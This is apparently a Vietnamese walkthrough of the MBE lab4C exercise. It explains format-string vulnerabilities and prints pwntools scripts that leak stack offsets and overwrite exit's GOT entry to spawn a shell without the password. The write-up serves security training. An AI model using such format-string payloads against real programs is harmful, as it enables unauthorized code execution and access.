# Problem 

Bài này chúng ta sẽ gặp 1 lỗi cũng nguy hiểm không kém cạnh Buffer Overflow, đó chính là lỗi Format String.
Nói 1 chút về format string, thì nó là lỗi do người lập trình có thói quen xấu khi code, hoặc khi người lập trình sử dụng các hàm print, printf.... mà không dùng những đặc tả như: %d %s %c .... Thay vào đó, người lập trình chỉ dùng:
```sh
print(username);
```
Điều này hết sức nguy hiểm, vì lỗi này có thể leak được những dữ liệu ` nhạy cảm ` từ stack khi chương trình đang chạy.

Bài này cho chúng ta sẵn hàm system("/bin/sh") để spawn shell khi nhập đúng password của chương trình. Nhưng mình thích không cần password nhưng vẫn leo shell luôn.

# solution

Hướng khai thác bài này của mình bằng cách spawn shell nhưng không cần mật khẩu. Mình sẽ lợi dụng việc khi chương tình so sánh mật khẩu nhập vào và mật khẩu đọc lên từ file, nếu sai thì chương trình sẽ exit. Chúng ta sẽ đổi địa chỉ exit@plt+6 này thành địa chỉ của `system("/bin/sh")`

Chúng ta sẽ lấy được số n bằng chương trình nhỏ như sau:

```sh
from pwn import *

count = 100
for i in range(100):
	p = process("./lab4C")
	print (str(i) + "\n")
	buf = "%" + str(i) +  "$08x"
	p.sendline(buf)
	p.sendline("1234")
	print("\n")
	print(p.recv(1000))
```

Sau khi nhìn vào kết quả trả về:

```sh
[+] Starting local process './lab4C': pid 24324
37



[*] Process './lab4C' stopped with exit code 1 (pid 24324)
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: --[ Password: -----------------------------------------
24373325 does not have access!

```

Mình sẽ biết được n = 37 vì `0x24373325 ~ %37$`

Việc còn lại là xác định địa chỉ của System("/bin/sh") với địa chỉ got của Exit mình dùng lệnh
`disassemble main` với `got` trong **GDB**

```sh
  0x08048aeb <+702>:	mov    DWORD PTR [esp],0x8048cd4
  0x08048af2 <+709>:	call   0x80486d0 <system@plt>

--------------------------------------------------------------

pwndbg> got

GOT protection: No RELRO | GOT functions: 13
 
[0x8049ee4] printf@GLIBC_2.0 -> 0x8048666 (printf@plt+6) ◂— push   0 /* 'h' */
[0x8049ee8] strcspn@GLIBC_2.0 -> 0x8048676 (strcspn@plt+6) ◂— push   8
[0x8049eec] fgets@GLIBC_2.0 -> 0x8048686 (fgets@plt+6) ◂— push   0x10
[0x8049ef0] fclose@GLIBC_2.1 -> 0x8048696 (fclose@plt+6) ◂— push   0x18
[0x8049ef4] fwrite@GLIBC_2.0 -> 0x80486a6 (fwrite@plt+6) ◂— push   0x20 /* 'h ' */
[0x8049ef8] fread@GLIBC_2.0 -> 0x80486b6 (fread@plt+6) ◂— push   0x28 /* 'h(' */
[0x8049efc] puts@GLIBC_2.0 -> 0x80486c6 (puts@plt+6) ◂— push   0x30 /* 'h0' */
[0x8049f00] system@GLIBC_2.0 -> 0x80486d6 (system@plt+6) ◂— push   0x38 /* 'h8' */
[0x8049f04] __gmon_start__ -> 0x80486e6 (__gmon_start__@plt+6) ◂— push   0x40 /* 'h@' */
[0x8049f08] exit@GLIBC_2.0 -> 0x80486f6 (exit@plt+6) ◂— push   0x48 /* 'hH' */
[0x8049f0c] __libc_start_main@GLIBC_2.0 -> 0xf7df1e30 (__libc_start_main) ◂— call   0xf7f102c9
[0x8049f10] fopen@GLIBC_2.1 -> 0x8048716 (fopen@plt+6) ◂— push   0x58 /* 'hX' */
[0x8049f14] strncmp@GLIBC_2.0 -> 0x8048726 (strncmp@plt+6) ◂— push   0x60 /* 'h`' */

```

Gòi xong, mình có chương trình exploit.py thay đổi địa chỉ thay thế exit@plt+6 thành địa chỉ của system("/bin/sh") như sau:

```sh
from pwn import *

def exp_fmt():
	p = process("./lab4C")
	raw_input("DEBUG")
	exit_got = 0x8049f08

	payload1  = "aa%s" + p32(exit_got) + p32(exit_got+0x1) + p32(exit_got+0x3)
	payload1 += "%" + str(0x048aeb-0x12) + "x%38$n"
	payload1 += "%" + str(0x08048a-0x048aeb) + "x%39$n"
	
	p.sendline(payload1)
	p.sendline("1234")
	p.interactive()

exp_fmt()
```
Run chương trình lên, ăn miếng bánh uống miếng nước....
Tadaaaaa.
```sh
zir@warzone:~/ctf/TrainingPwn/MBE_release/levels/lab04$ python exploit4C.py 
[+] Starting local process './lab4C': pid 25540
DEBUGS 


                                                                                                                             804a160 does not have access!
$ id
uid=1000(zir) gid=1000(zir) groups=1000(zir),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
Vậy là chúng ta spawn shell thành công mà không cần mật khẩu chương trình. Chúc các bạn một ngày tốt lành. 😎😎😎


